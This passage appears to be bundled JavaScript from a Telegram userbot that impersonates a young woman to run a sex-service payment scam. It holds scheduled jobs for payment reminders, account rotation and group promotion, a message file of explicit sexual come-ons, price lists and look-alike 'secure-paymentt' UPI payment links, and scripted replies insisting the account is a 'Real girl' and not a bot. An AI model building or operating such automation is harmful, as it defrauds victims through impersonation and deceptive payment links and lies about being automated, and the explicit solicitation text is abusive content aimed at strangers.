                    console.log("Empty Msg- ", messages, peer.toJSON().username, peer.toJSON().firstName, event.message.text);
                }
            }
            catch (error) {
                yield (0, utils_1.broadcast)('ERROR: ', error);
                yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.limitTime, Date.now() + 10000);
            }
        }
        catch (error) {
            yield (0, utils_1.broadcast)('ERROR', error);
        }
    });
}


/***/ }),

/***/ "./src/jobs.ts":
/*!*********************!*\
  !*** ./src/jobs.ts ***!
  \*********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.JobManager = void 0;
exports.runJobs = runJobs;
const index_1 = __webpack_require__(/*! ./index */ "./src/index.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const promotions_1 = __webpack_require__(/*! ./utils/promotions */ "./src/utils/promotions.ts");
const node_schedule_1 = __importDefault(__webpack_require__(/*! node-schedule */ "node-schedule"));
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const logbots_1 = __webpack_require__(/*! ./utils/logbots */ "./src/utils/logbots.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
class JobManager {
    constructor() {
        this.checksInterval = null;
        this.assureJob = null;
        this.maintenanceJob = null;
        this.paymentReminderJob = null;
        this.dailyResetJob = null;
    }
    static getInstance() {
        if (!JobManager.instance) {
            JobManager.instance = new JobManager();
        }
        return JobManager.instance;
    }
    logMessage(message) {
        console.log(`[JobManager] ${message}`);
    }
    startJobs() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                this.stopJobs(); // Clear any existing jobs
                yield this.startJobsInterval();
                yield this.setupScheduledJobs();
                const promotor = promotions_1.Promotor.getInstance(index_1.tgClass.getClient());
                yield promotor.PromoteToGrp();
                this.logMessage('All jobs started successfully');
            }
            catch (error) {
                this.stopJobs(); // Cleanup on error
                (0, parseError_1.parseError)(error, "JobManager.startJobs");
                throw error; // Re-throw to notify caller
            }
        });
    }
    stopJobs() {
        if (this.checksInterval) {
            clearInterval(this.checksInterval);
            this.checksInterval = null;
        }
        // Cancel all scheduled jobs
        [this.assureJob, this.maintenanceJob, this.paymentReminderJob, this.dailyResetJob].forEach(job => {
            if (job) {
                job.cancel();
            }
        });
        this.logMessage('All jobs stopped');
    }
    startJobsInterval() {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.checksInterval) {
                this.logMessage('Checks job is already running, skipping this iteration');
                return;
            }
            let runCount = 0; // Counter to track runs
            const runChecks = () => __awaiter(this, void 0, void 0, function* () {
                runCount++;
                this.logMessage(`Starting periodic checks... Run #${runCount}`);
                try {
                    if (runCount % 2 !== 0) {
                        try {
                            this.logMessage('Running checkProfilePics...');
                            yield this.checkProfilePics();
                            this.logMessage('checkProfilePics finished');
                        }
                        catch (error) {
                            this.logMessage(`Error in checkProfilePics, continuing: ${error.message}`);
                        }
                        try {
                            this.logMessage('Running markAsRead...');
                            yield this.markasread();
                            this.logMessage('markAsRead finished');
                        }
                        catch (error) {
                            this.logMessage(`Error in markAsRead, continuing: ${error.message}`);
                        }
                        try {
                            const db = dbservice_1.UserDataDtoCrud.getInstance();
                            const promotedStats = yield db.readPromoteStats();
                            if (promotedStats.isActive && promotedStats.lastUpdatedTimeStamp < Date.now() - 1000 * 60 * 15) {
                                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${process.env.clientId}: Promotions are NOT working! Rotating User...!!`);
                                const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=true&days=10&formalities=true`;
                                yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
                            }
                        }
                        catch (error) {
                            this.logMessage(`Error in reading promote stats or promoting: ${error.message}`);
                        }
                    }
                    try {
                        this.logMessage('Running checkPromotions...');
                        yield this.checkPromotions();
                        this.logMessage('checkPromotions completed');
                    }
                    catch (error) {
                        this.logMessage(`Error in checkPromotions, continuing: ${error.message}`);
                    }
                }
                catch (error) {
                    this.logMessage(`Error in periodic checks: ${error.message}`);
                }
                finally {
                    this.logMessage('Periodic checks completed');
                }
            });
            // Initial run
            yield runChecks();
            // Setup interval with error handling
            this.checksInterval = setInterval(runChecks, 5 * 60000);
        });
    }
    setupScheduledJobs() {
        return __awaiter(this, void 0, void 0, function* () {
            const timezone = 'Asia/Kolkata';
            // Assure job - Every hour at minute 0
            this.assureJob = node_schedule_1.default.scheduleJob({ rule: '0 * * * *', tz: timezone }, () => __awaiter(this, void 0, void 0, function* () {
                this.logMessage("Running assure job...");
                try {
                    if (yield index_1.tgClass.instanceExist()) {
                        const hour = new Date().getHours();
                        this.logMessage(`Current hour: ${hour}`);
                        try {
                            this.logMessage('Running assureppl...');
                            yield this.assureppl();
                            const promotor = promotions_1.Promotor.getInstance(index_1.tgClass.getClient());
                            yield promotor.PromoteToGrp();
                            this.logMessage('assureppl completed');
                        }
                        catch (error) {
                            this.logMessage(`Error in assureppl: ${error.message}`);
                            (0, parseError_1.parseError)(error, "AssureJob.assureppl");
                        }
                        yield (0, Helpers_1.sleep)(2000);
                        try {
                            if (hour % 3 === 0) {
                                this.logMessage('Running callToPaid (3-hour interval)...');
                                yield (0, utils_1.callToPaid)();
                                this.logMessage('callToPaid completed');
                            }
                        }
                        catch (error) {
                            this.logMessage(`Error in callToPaid: ${error.message}`);
                            (0, parseError_1.parseError)(error, "AssureJob.callToPaid");
                        }
                    }
                }
                catch (error) {
                    this.logMessage(`Error in promotion job: ${error.message}`);
                    (0, parseError_1.parseError)(error, "AssureJob");
                }
            }));
            // Payment reminder job - At specific hours
            this.paymentReminderJob = node_schedule_1.default.scheduleJob({ rule: '15 7,13,16,21,23 * * *', tz: timezone }, () => __awaiter(this, void 0, void 0, function* () {
                this.logMessage('Running payment reminder job...');
                try {
                    if (yield index_1.tgClass.instanceExist()) {
                        this.logMessage('Running asktoPay...');
                        yield (0, utils_1.asktoPay)(index_1.tgClass.getClient(), 3000);
                        this.logMessage('asktoPay completed');
                    }
                }
                catch (error) {
                    this.logMessage(`Error in payment reminder job: ${error.message}`);
                    (0, parseError_1.parseError)(error, "PaymentReminderJob");
                }
            }));
            // Daily reset job - At midnight
            this.dailyResetJob = node_schedule_1.default.scheduleJob({ rule: '23 0 * * *', tz: timezone }, () => __awaiter(this, void 0, void 0, function* () {
                this.logMessage('Running daily reset job...');
                try {
                    if (yield index_1.tgClass.instanceExist()) {
                        const db = dbservice_1.UserDataDtoCrud.getInstance();
                        yield db.resetUnpaid();
                        yield (0, index_1.getUserStats)(false);
                        yield db.activatePromotions();
                        this.logMessage('Daily reset job completed successfully');
                    }
                }
                catch (error) {
                    this.logMessage(`Error in daily reset job: ${error.message}`);
                    (0, parseError_1.parseError)(error, "DailyResetJob");
                }
            }));
            // Verify all jobs are scheduled
            const jobs = [
                { name: 'Assure Job', job: this.assureJob },
                { name: 'Payment Reminder Job', job: this.paymentReminderJob },
                { name: 'Daily Reset Job', job: this.dailyResetJob }
            ];
            jobs.forEach(({ name, job }) => {
                if (job && job.nextInvocation()) {
                    this.logMessage(`${name} scheduled. Next run: ${job.nextInvocation().toISOString()}`);
                }
                else {
                    throw new Error(`Failed to schedule ${name}`);
                }
            });
        });
    }
    assureppl() {
        return __awaiter(this, void 0, void 0, function* () {
            this.logMessage('Starting assureppl...');
            try {
                const msg = (0, messages_1.pickOneMsg)(messages_1.messages.assureMSgArray);
                this.logMessage(`Selected message: ${msg ? 'Custom message' : 'Default message'}`);
                if (yield index_1.tgClass.instanceExist()) {
                    this.logMessage('Running respToPaidPplfn...');
                    yield (0, utils_1.respToPaidPplfn)(yield index_1.tgClass.getClient(), msg ? 6000 : 24000, msg, false, true, false);
                    this.logMessage('respToPaidPplfn completed');
                }
                else {
                    this.logMessage('Telegram instance not available, skipping assureppl');
                }
            }
            catch (error) {
                this.logMessage(`Error in assureppl: ${error.message}`);
                (0, parseError_1.parseError)(error);
            }
            this.logMessage('assureppl completed');
        });
    }
    markasread() {
        return __awaiter(this, void 0, void 0, function* () {
            this.logMessage('Starting markasread...');
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    this.logMessage('Running MarkAsRead...');
                    yield (0, utils_1.MarkAsRead)(index_1.tgClass.getClient(), false);
                    this.logMessage('MarkAsRead completed successfully');
                }
                else {
                    this.logMessage('Telegram instance not available, skipping MarkAsRead');
                }
            }
            catch (error) {
                this.logMessage(`Error in markasread: ${error.message}`);
                (0, parseError_1.parseError)(error, "MarkAsReadJob");
            }
            this.logMessage('markasread completed');
        });
    }
    checkProfilePics() {
        return __awaiter(this, void 0, void 0, function* () {
            this.logMessage('Starting checkProfilePics...');
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    this.logMessage('Running checkProfilePics operation...');
                    yield (0, utils_1.checkProfilePics)(index_1.tgClass.getClient());
                    this.logMessage('checkProfilePics operation completed successfully');
                }
                else {
                    this.logMessage('Telegram instance not available, skipping checkProfilePics');
                }
            }
            catch (error) {
                this.logMessage(`Error in checkProfilePics: ${error.message}`);
                (0, parseError_1.parseError)(error, "CheckProfilePicsJob");
            }
            this.logMessage('checkProfilePics completed');
        });
    }
    checkPromotions() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (yield index_1.tgClass.instanceExist()) {
                    const db = dbservice_1.UserDataDtoCrud.getInstance();
                    const promotedStats = yield db.readPromoteStats();
                    const promotor = promotions_1.Promotor.getInstance(index_1.tgClass.getClient());
                    if (promotor.lastMessageTime < Date.now() - 1000 * 60 * 6) {
                        if (promotedStats.isActive) {
                            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${process.env.clientId}: Promotions are NOT working!`);
                            yield promotor.PromoteToGrp();
                        }
                        else {
                            this.logMessage('Promotions are Inactive!');
                        }
                    }
                    else {
                        this.logMessage('Promotions are working fine!');
                    }
                }
                else {
                    this.logMessage('Telegram instance not available, skipping PromoteChannel');
                }
            }
            catch (error) {
                this.logMessage(`Error in checkPromotions: ${error.message}`);
                (0, parseError_1.parseError)(error, "PromoteChannelJob");
            }
        });
    }
}
exports.JobManager = JobManager;
function runJobs() {
    return __awaiter(this, void 0, void 0, function* () {
        const maxRetries = 3;
        let retryCount = 0;
        while (retryCount < maxRetries) {
            try {
                yield JobManager.getInstance().startJobs();
                break; // If successful, exit the retry loop
            }
            catch (error) {
                retryCount++;
                (0, parseError_1.parseError)(error, "runJobs");
                if (retryCount < maxRetries) {
                    console.log(`Retrying job startup (attempt ${retryCount + 1}/${maxRetries})...`);
                    yield (0, Helpers_1.sleep)(5000 * retryCount); // Exponential backoff
                }
                else {
                    console.error('Failed to start jobs after maximum retries');
                    throw error;
                }
            }
        }
    });
}


/***/ }),

/***/ "./src/messages.ts":
/*!*************************!*\
  !*** ./src/messages.ts ***!
  \*************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.randomMsg = exports.messages = exports.payLinks = exports.links2 = exports.endpoint = void 0;
exports.pickOneMsg = pickOneMsg;
console.log("in MEssages");
const UpiClass_1 = __webpack_require__(/*! ./UpiClass */ "./src/UpiClass.ts");
exports.endpoint = `mode=02&mam=15&mc=0000`;
const finalEndpoint = `name=${process.env.name.replace(/\s/g, "")}`;
class links2 {
}
exports.links2 = links2;
links2.PhonePe1 = `secure-paymentt.netlify.app/?protocol=phonepe&upi=${UpiClass_1.UpiIds['ppay']}&${finalEndpoint}`;
links2.PhonePe2 = `secure-paymentt.netlify.app/?protocol=phonepe&upi=${UpiClass_1.UpiIds['bpayGen']}&${finalEndpoint}`;
links2.PhonePe3 = `secure-paymentt.netlify.app/?protocol=phonepe&upi=${UpiClass_1.UpiIds['bpay2']}&${finalEndpoint}`;
links2.Paytm1 = `secure-paymentt.netlify.app/?protocol=paytm&upi=${UpiClass_1.UpiIds['paytm1']}&${finalEndpoint}`;
links2.Paytm2 = `secure-paymentt.netlify.app/?protocol=paytm&upi=${UpiClass_1.UpiIds['paytm2']}&${finalEndpoint}`;
links2.Paytm3 = `secure-paymentt.netlify.app/?protocol=paytm&upi=${UpiClass_1.UpiIds['paytm3']}&${finalEndpoint}`;
links2.GPay2 = `secure-paymentt.netlify.app/?protocol=gpay&upi=${UpiClass_1.UpiIds['gpay']}&${finalEndpoint}`;
links2.GPay1 = `secure-paymentt.netlify.app/?protocol=gpay&upi=${process.env.gpayId}&${finalEndpoint}`;
links2.others = `secure-paymentt.netlify.app/?protocol=others&upi=${UpiClass_1.UpiIds['bpayGen']}&${finalEndpoint}`;
links2.fampay = `secure-paymentt.netlify.app/?protocol=FamPay&upi=${UpiClass_1.UpiIds['bpay2']}&${finalEndpoint}`;
class payLinks {
}
exports.payLinks = payLinks;
payLinks.phonepe1 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.PhonePe1}'>PhonePe 1</a></b>`;
payLinks.phonepe2 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.PhonePe2}'>PhonePe 2</a></b>`;
payLinks.phonepe3 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.PhonePe3}'>PhonePe</a></b>`;
payLinks.paytm1 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.Paytm1}'>PayTm 1</a></b>`;
payLinks.paytm2 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.Paytm2}'>PayTm 2</a></b>`;
payLinks.paytm3 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.Paytm3}'>PayTm</a></b>`;
payLinks.gpay1 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.GPay1}'>G-Pay</a></b>`;
payLinks.gpay2 = `<b>👉🏻👉🏻&nbsp; <a href='${links2.GPay2}'>G-Pay</a></b>`;
payLinks.others = `<b>👉🏻👉🏻&nbsp; <a href='${links2.others}'>Personal_Link</a></b>`;
payLinks.fampay = `<b>👉🏻👉🏻&nbsp; <a href='${links2.fampay}'>FamPay</a></b>`;
const awayMessges = [
    'Sorry, wait a while!!Dont worry, I will call you!!',
    "I'm Outside now, I will only Call you in some time!",
    'Sorry for the delay, I will Call you when I have a moment',
    'Can you please wait for a while? I will Call you after 1 hour',
    "I Just Came outside, I will only call u when I'm free!!",
    "My boyfried is here, I will call after sometime.",
    "My friend is my room, I will message yo after sometime ok"
];
const initMsgs = [
    "Oye.....😚",
    "Haaa Bayyy....💦",
    "Oyeee....Baby💋!!",
    "Hello Dear....👅",
    "Baby....😚😚",
    "Love you Baby💋💋",
    "U there Baby....🍆",
    "I am Waiting for you baby😚",
    '👀', 'Had Lunch??',
    'In mood???',
    'Come Online Baby😚',
    'Oyyy... there??👀',
    '😚😚', 'hmmm👀',
    'What do you do?', 'haaa', 'haaa❤️', '?',
    "I'm mood now!!😔", 'are you vigin?', 'Show Me your Dick!!',
    "I'm Pressing my boobs now🙈", 'Will you lick my pussy??🙈',
    'Your Dick is Hard Now??🙈', 'You want to lick My nipples?🙈',
    'Your Dick Size??', 'what are you doing?',
    'Where are you from?', 'What do like Most in SEX👀', 'your age?',
    'what?', 'You want to kiss my boobies?🙈',
    "I'm not Wearing Dress now!!🙈\nTake the Demo!!", 'Hmm Okay❤️',
    "👀👀", 'hmm👀'
];
exports.messages = {
    initMsgs: initMsgs,
    awayMessges: awayMessges,
    assureMSgArray: [
        "I'm little busy now, I will call u in some time",
        'Oyee.... Now??',
        'Oyee.... U there?',
        "Lets do now??",
        "Are you free now??",
        "Hey...Dont worry!!\nI will Call you pakka ok!!",
        "Hey...Dont worry!!\nI will Call you pakka ok!!",
        ...awayMessges
    ],
    thanksArray: [`Aww...Thanks Naughty Boii!! ♥️🙈👀 `,
        `Thank youuu Dear!!♥️`,
        'Haha... Thanks🙈',
        `Thanks Baby🤗`,
        '♥️🙈♥️🙈♥️🙈',
        'Thanks a lot, dear! ❤️',
        'Thank you so much, love! 😍😚',
        'Thank you very much, sweetheart! 💖',
        'Thank you, dearie! 🥰',
        'Thank you, my dear! 😘',
    ],
    PayMsgArray: [
        `Just **Pay Now**\nNext Second itself..I will call nd SHOW you My BOOBs🙈🙈!!\n`,
        `**PAY** and **Message Me Dear!!**\nI will do **Now Itself🤗**\n`,
        "I'm ready and waiting! 😏\nComplete the payment and message me. 😚\n",
        "Oyyy...Pay and Msg!\nI'm ready to provide service 😚❤️\n",
        "I'm also ready now! 😏\nPay and message me. 💸📩\n",
        `**PAY** and **Message Me!**\nI will do **Now Itself**\n`,
        "Yeah, Do the Payment First!!\nI'm Ready for Service!!❤️\n",
        "I'm ready now😏!!\n** Pay and Msg me**\n",
        "I'm also in Mood now😏!!\n** Pay and Msg me😚**\n"
    ],
    bye: `Byee!!`,
    cantPay: `If You cant Pay Just **20₹** to a **Beautiful Girl** Like Me!! Never message me again and Waste your own Time!!`,
    time: `Demo : 1 minute\nFull service 1 hour\n\nFor any service you take!`,
    wait: "**I'm Checking Payments**, What is Your Name on Payment???\n\nWait... 5 Mins!!\n\n**Send your Payment Screenshot Once Now!!**",
    screenshot: `**Send ur  Payment Screenshot!!**`,
    qr: '**"PhonePe / PayTm"  ONLY!!** 👆👆\n',
    qr1: 'Pay to this NEW QR Code!!',
    pynw: `${payLinks.phonepe1}\n${payLinks.phonepe2}\n${payLinks.paytm1}\n${payLinks.paytm2}\n${payLinks.fampay}`,
    demo: `\n**DEMO** Nude pics: **25₹**\n**DEMO** Video call: **50₹**\n**DEMO** Voice call: **40₹**\n\n**Pay on My Website 👉🏻 ${process.env.link}**`,
    noFreeDemo: `**No FREE Demos!!**`,
    installments: 'You Can Take Video call in Installments!!\n\n**Like...Daily 15Mins!!So 4 days u can enjoy in Full video call.🤗🤗**',
    daily100: `So Many **People** Msg me for **Free Demo😔**\nI cant waste my time on **TimePassers!!**\n\nDemo **Video Call** is just **50₹!!**\nTake **Full Service** Only If U like **Demo VC!!**\n\n**PAY nd Enjoy** me Like a **REAL MAN!!🔥❤️**\nDont be a **TimePasser!!😏**`,
    just50: `**Video Call** is just 👉🏻 **50₹!!**\n\nDont be a **TimePasser Baby!!😏**\n**Pay nd Msg!!**`,
    just50two: `**Video Call** is JUST **50₹!!**\nI will **Show Everything** to You!!\n\nDont be a **TimePasser!!😏**` + '\n**Just TRY ONCE Dear...❤️❤️**',
    link: `\n**Pay on my Website 👇👇\n${process.env.link}**`,
    dir: `OPEN 👉🏻 **${process.env.demolink}/${process.env.clientId}**`,
    upiID: `**${UpiClass_1.UpiIds.gpayid}**`,
    pricelist: `**Full Service**\n\nSex chat                     :  **150₹/-**\n30 Full Nude Pics     :  **200₹**/-\n7 Full Nude Videos   :  **400₹/-**\nVoicecall sex             :   **350₹/-**\n\n**Full Nude Video call**  : **600₹/-**  (1 hour)`,
    botArray: [`No, I'm using **Auto reply** option!!\nDont worry I'm **Real girl** only!!`, `No Dear, Dont worry I'm **Real girl** only!!`, 'No Baby, I am Not!!'],
    thanksNdPay: `**PAY** and **Msg Me!!**\nI will Call you **Now Itself!\n\nOPEN 👉🏻 ${process.env.link}**`,
    ntnw: `Not now,\n**First take Online Service....🤗**\nIf I like your Behaviour and If i get satisfied with your **Video Call**...😚😚\nI will give you **My Address** and **NUMBER**.`,
    doing: `**Giving service** to other BOY\nHe PAID me just now`,
    fine: "I'm fine, you?",
    aut: "Heyy!!\n\nAll the Above message are **AUTOMATIC SYSTEM Msgs**. Please ignore!!",
    okayPay: `okay!!\n**Pay** and Msg me....**I'm Ready!!**`,
    dp: `Sure okay......!!\nYou See **All the Pics** in **My Profile**...!!\n\n**Pay for Demo**,I will send you more **Secret Pics**😜😜`,
    allDp: `You See **All the Pics** in **My Profile**...!!\n\n**Pay for Demo**,I will send you more **Secret Pics**😜😜`,
    notVirgin: "No, I'm not virgin!!",
    age: `I'm 24yrs old`,
    language: `I know telugu, hindi, english`,
    notMarried: "No, I'm not Married yet!!😜",
    number: '**Yes Okay**,\n\nPay and Message me!!\nI will call now...!!',
    study: "I'm doing **M.Tech** now!!",
    greeting: `\n\nI'm ready to do **Full Nude Video Call, Phone Sex, I will Send my NUDE Pics and Videos**💵\n\n🟢 **DEMO** Nude pics: **25₹**\n**🟢 DEMO** Video call: **50₹**\n🟢 **DEMO** Voice call: **40₹**\n\n\nI will make ur **Dick 🍆 Very HARD** that u will **Cumm** with **Full Satisfaction!!♥️🙈👀 **`,
    nameGreet: `!!!** \n\nI'm **${process.env.name}**\nAge: **24yrs**\nFrom: **HYDERABAD**\n\nAll online **SEX SERVICES** AVAILABLE`,
    channelLinks: `**My Website 👉🏻 ${process.env.link}\nJOIN 👉🏻 @${process.env.channelLink}**`,
    pp: `**Yes!!**\n\nIf u want more... Pay for the Demo!!`,
    nmns: "Pay and Msg!!\n\n**No MONEY? then No SERVICE!!\n\nDont WASTE your TIME,\nI will not do Anything Without Money!!**"
};
exports.randomMsg = [exports.messages.demo, exports.messages.just50, exports.messages.just50two, ...initMsgs, "qr", 'numb', 'numb', ...exports.messages.PayMsgArray,];
function pickOneMsg(msgsArray) {
    return (msgsArray[Math.floor(Math.random() * msgsArray.length)]);
}


/***/ }),

/***/ "./src/outhandler.ts":
/*!***************************!*\
  !*** ./src/outhandler.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.OutEventPrint = OutEventPrint;
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const inhandlerUpdated_1 = __webpack_require__(/*! ./inhandlerUpdated */ "./src/inhandlerUpdated.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const index_1 = __webpack_require__(/*! ./index */ "./src/index.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
const db = dbservice_1.UserDataDtoCrud.getInstance();
function OutEventPrint(event) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        if (event.isPrivate) {
            const message = event.message;
            const text = message.text.toLowerCase();
            const receiver = yield message.getInputChat();
            console.log(`${process.env.name} : ${text}`);
            const chatId = event.message.chatId.toString();
            try {
                if (`ptt` === text) {
                    yield event.client.sendMessage(chatId, {
                        message: messages_1.messages.daily100
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `jus`) {
                    yield event.client.sendMessage(chatId, {
                        message: messages_1.messages.just50
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text.startsWith(`join`)) {
                    const string = text.split(':')[1];
                    yield (0, utils_1.joinGrps)(event.client, string);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (`pynw` === text) {
                    yield event.client.sendMessage(chatId, {
                        message: `<b>Pay now</b> and send me <b>Screenshot!!\n\n\n👉🏻<a href="${process.env.link}/">CLICK HERE!!</a></b>`,
                        parseMode: `html`,
                        linkPreview: false
                    });
                    yield event.client.sendMessage(chatId, { message: `**My Website 👉🏻 ${process.env.link}**` });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `time`) {
                    yield event.client.sendMessage(chatId, {
                        message: messages_1.messages.time
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `allinks`) {
                    let rep = '';
                    Object.values(messages_1.payLinks).forEach((link) => {
                        rep = rep + link + '\n';
                    });
                    console.log(rep);
                    yield event.client.sendMessage(chatId, { message: rep, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text.startsWith('off')) {
                    const dur = text.split(' ')[1];
                    yield (0, inhandlerUpdated_1.setLimit)(event.message.chatId.toString(), parseInt(dur));
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'on') {
                    yield (0, inhandlerUpdated_1.liftLimit)(event.message.chatId.toString());
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'getchannels') {
                    const chats = yield event.client.getDialogs({ limit: 130 });
                    let reply = '';
                    chats.map((chat) => {
                        var _a;
                        if (chat.isChannel || chat.isGroup) {
                            const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
                            reply = reply + ((_a = chat.entity.toJSON()) === null || _a === void 0 ? void 0 : _a.title) + " " + username + ' \n';
                        }
                    });
                    event.client.sendMessage('me', { message: reply });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text.startsWith('py')) {
                    const am = parseInt(text.split(' ')[1]);
                    yield (0, inhandlerUpdated_1.setPayAm)(event.message.chatId.toString(), am);
                    yield (0, inhandlerUpdated_1.setLimit)(event.message.chatId.toString(), 300);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'reset') {
                    yield (0, inhandlerUpdated_1.resetDb)(event.message.chatId.toString());
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'data') {
                    const data = yield db.read(event.message.chatId.toString());
                    let reply = '';
                    Object.keys(data).map((key) => {
                        reply = reply + `${key}: **${data[key]}\n**`;
                    });
                    yield event.client.sendMessage('me', { message: reply });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'vca') {
                    yield event.client.sendMessage(chatId, { message: `Message me at **@MyVcAcc**\n\nI will call you in that **Account!!**` });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'lgn') {
                    yield event.client.sendMessage(chatId, { message: `LOGIN here 👇🏻👇🏻\n\n**${process.env.link}**\n**${process.env.link}**\n\nSend me Screenshot After Login!!`, linkPreview: true });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'pstm') {
                    yield event.client.sendMessage(chatId, { message: `5+ Mins!!` });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'gpay1') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.gpay1, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'gpay2') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.gpay2, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'svl') {
                    yield event.client.sendMessage(chatId, { message: `Hey U can Call me here\n\nhttps://zomCall.netlify.app/${process.env.clientId}/${event.message.chatId.toString()}\n\nCall me now!!`, linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text == 'addevents') {
                    yield (0, utils_1.deleteMessage)(event);
                    try {
                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/requestCall?clientId=${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toLowerCase()}&chatId=${event.message.chatId.toString()}`);
                    }
                    catch (error) {
                        console.log('Cannot request Another call', error);
                    }
                }
                else if (text === 'ppay1') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.phonepe1, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'ptm1') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.paytm1, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'ppay2') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.phonepe2, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'ptm2') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.paytm2, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'ppay3') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.phonepe3, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'ptm3') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.paytm3, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'otr') {
                    yield event.client.sendMessage(chatId, { message: messages_1.payLinks.others, parseMode: 'html', linkPreview: false });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'hs') {
